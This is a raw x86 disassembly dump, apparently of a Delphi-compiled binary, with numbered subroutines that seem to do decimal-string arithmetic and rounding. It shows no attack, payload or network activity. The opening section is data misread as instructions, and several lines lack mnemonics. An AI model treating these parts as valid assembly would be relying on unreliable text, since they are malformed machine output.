add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ eax + 0xc0046 ] 0x1
add [ eax ] al
js r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ 0x64634245 ] cl
inc ebp
js r-xdata
push ecx
inc ecx
add [ eax ] bl
push ecx
inc ecx
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
jo r-xdata
popad
popad
outsb
je r-xdata
add [ edx * 2 + 0x51000041 ] ah
inc ecx
add al al
sbb [ ecx + 0x41 ] dl
insb
outsd
ja r-xdata
cwde
inc esi
add al bh
cdq
inc esi
add [ ebp + ecx * 2 + 0x41 ] ch
outsd
outsb
mov eax eax
nop
xchg ecx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
xchg ecx eax
inc esi
add [ eax + eax ] dl
add [ eax ] al
pushad
pop esp
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
inc eax
add [ 0x64634245 ] dl
dec edi
jbe r-xdata
imul ebp [ edi + 0x6e ] 0x912cc08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 ] ch
inc esi
add [ eax + eax ] cl
add [ eax ] al
test [ eax + 0x34640046 ] dl
inc eax
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
outsd
jne r-xdata
pushad
xchg edx eax
inc esi
add [ edi ] al
or edx [ esi + eax * 2 + 0x4d ]
push esp
je r-xdata
sub al 0xa8
jns r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + edx * 2 + 0x41 ] dh
add al cl
push ecx
inc ecx
add [ ecx + edx * 2 ] al
inc ecx
add [ eax ] bh
js r-xdata
add [ eax + eax ] 0x8
inc ecx
insb
push esp
adc [ eax ] al
sbb [ ebp - 0x69dfffba ] dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esi
add [ eax ] ah
xchg esi eax
inc esp
xchg edx eax
inc esi
add [ eax + 0x500417f ] bh
add [ esi ] al
inc esi
dec ebp
push esp
inc edx
arpl [ ebp + eax ] sp
mov esp 0x74004010
xchg ebp eax
inc esi
add [ esi + edx * 4 + 0x10046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al [ ecx + 0x73 ]
inc ebx
jne r-xdata
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ ebx ] cl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
nop
inc esp
xchg edx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6e ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6e ] dl
inc esi
add [ eax ] ch
add [ eax ] al
add [ edi + edi * 2 + 0x41 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
inc ecx
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
jo r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_46939b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
je r-xdata
outsb
je r-xdata
jae r-xdata
adc [ eax ] al
lodsb [ esi ]
xchg esp eax
inc esi
add [ eax + 0x1004695 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080004 ] al
jb r-xdata
add [ eax + 0x24004698 ] dh
fwait
inc esi
add [ eax - 0x65 ] dh
inc esi
add [ ecx + edx * 2 + 0x41 ] cl
add [ ecx * 2 - 0x6437ffbf ] dh
inc esi
add [ eax ] dl
push edx
inc ecx
add al ch
push edi
inc ecx
add ah dh
push edi
inc ecx
add [ esp ] cl
inc ecx
add [ esp + 0x41 ] bh
add ah al
fwait
inc esi
add [ edx ] dl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x9190c08b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
test [ eax + 0xfe80046 ] dl
and eax 0xeee8fffa
movsd [ edi ] [ esi ]
stc
[ ebx - 0x3d ]
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
pop ebx
retn
imul ebp [ esi + 0x67 ] 0x83ec8b55
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
inc ecx
outsb
arpl [ ecx - 0x54 ] di
adc [ eax ] al
rcl [ esi + eax * 2 + 0x4695b000 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ ecx + 0x73 ] al
push ebx
jae r-xdata
adc [ eax ] al
push 0x88004695
xchg esi eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0003 ] al
mov eax ebx
call sub_408f58
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
add [ eax + 0x41090002 ] al
jae r-xdata
sub_469334
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469394
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax ebx
call sub_408f58
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46939b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4693d4
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46c088
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469408
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46bd2c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46943c
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46be60
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469468
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46c01c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_4694c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469509
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_46c3b8
mov eax [ ebp - 0xc ]
call sub_4096e4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469510
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_469518
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469559
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46c3b8
mov eax [ ebp - 0x4 ]
call sub_40837c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469560
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_469588
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_469be8
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_4695b0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469610
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x28 ]
call sub_409684
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_469be8
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469617
lea eax [ ebp - 0x28 ]
call sub_403f6c
retn
sub_469620
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46967a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_408240
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_469be8
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469681
lea eax [ ebp - 0x28 ]
call sub_403f6c
retn
sub_4696b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x22
call sub_402988
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4696fc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46979c
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0xc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409684
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x22 ]
call sub_469be8
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov ecx esi
call sub_46b908
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403540
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_4696b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4697a3
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x4c ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4c ]
call sub_4693bc
sub_4697a3
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4697c4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46984b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x22 ]
mov eax esi
call sub_469be8
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov cx [ ebp + 0xc ]
call sub_46b908
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403540
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_4696b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469852
lea eax [ ebp - 0x48 ]
call sub_403f6c
retn
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x48 ]
call sub_4693bc
sub_469852
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_469874
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_4696b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4698c0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4699ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_4699cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415164
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151f0
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_4699a0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415170
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push 0x8
mov cx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_4696fc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
push 0x20
push 0x8
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151fc
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4697c4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4699d4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
sub_4699f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_469b12
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414ce0
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_4694ac
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047c4
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4151a4
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b19
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x18 ]
call sub_404678
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_4694ac
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415198
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_469adb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x5
mov eax [ ebx + 0x8 ]
add eax 0x4
call sub_469c44
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
sub_469b24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_469874
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_415184
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_415164
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_469b70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_4693fc
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469430
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46943c
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469468
jmp r-xdata
jmp r-xdata
call sub_415128
sub_469bc8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_469494
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_469be8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469c36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46b46c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469c3d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_469334
sub_469c44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469c8c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46c3b8
mov eax [ ebp - 0xc ]
call sub_4096e4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469c93
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_469c9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469dba
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_404570
mov edi eax
test di di
jne r-xdata
add si di
mov eax [ ebp - 0x4 ]
call sub_40422c
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
cmp si di
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40422c
movsx edx si
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
movsx edx si
dec edx
add eax edx
lea edx [ eax + 0x1 ]
cmp [ edx ] 0x35
jb r-xdata
test si si
jle r-xdata
mov dl [ eax ]
inc edx
mov [ eax ] dl
jmp r-xdata
cmp [ eax ] 0x39
jbe r-xdata
cmp [ eax ] 0x39
ja r-xdata
mov eax [ ebp - 0x8 ]
push eax
movsx ecx si
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_40448c
jmp r-xdata
mov [ eax ] 0x30
lea eax [ ebp - 0x10 ]
push eax
movsx ecx si
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_40448c
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404278
jmp r-xdata
cmp bl [ eax ]
je r-xdata
cmp bl [ eax ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469dc1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
dec esi
dec eax
cmp bl [ eax ]
je r-xdata
mov [ eax ] 0x30
mov dl [ eax ]
inc edx
mov [ eax ] dl
sub_469dd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx ]
call sub_40422c
dec eax
jle r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
push ebx
mov eax [ ebx ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40448c
sub_469e10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov eax [ ebp - 0x8 ]
call sub_40441c
xor eax eax
push ebp
push sub_469eb6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_469dd4
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404004
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_40422c
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov ebx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f68
mov ebx eax
or ebx 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ebd
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
sub_469ec4
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40441c
mov eax [ ebp - 0x8 ]
call sub_40441c
xor eax eax
push ebp
push sub_46a05c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469e10
dec eax
jle r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
test esi esi
jle r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_404570
mov esi eax
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x1c ]
mov edx [ edx ]
call sub_404570
mov edi eax
test esi esi
jne r-xdata
test edi edi
jle r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_404154
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor ecx ecx
call sub_40cd14
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_403fc0
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
sub eax esi
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
dec [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffff01
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a063
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403f90
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_404154
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
xor ecx ecx
call sub_40cd14
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x1c ]
call sub_403fc0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax edi
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
dec [ eax ]
sub_46a070
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0x8 ]
mov ebx eax
sub bl 0x30
mov al [ ebp - 0x1 ]
sub al 0x30
add bl al
add bl [ edi ]
cmp bl 0x9
jbe r-xdata
mov eax esi
mov edx ebx
add dl 0x30
call sub_404154
mov [ edi ] 0x0
mov eax esi
mov edx ebx
sub dl 0xa
add dl 0x30
call sub_404154
mov [ edi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax esi
mov edx r-xdata
call sub_403fc0
cmp [ esi ] 0x0
jne r-xdata
sub_46a0dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov edi [ ebp + 0x8 ]
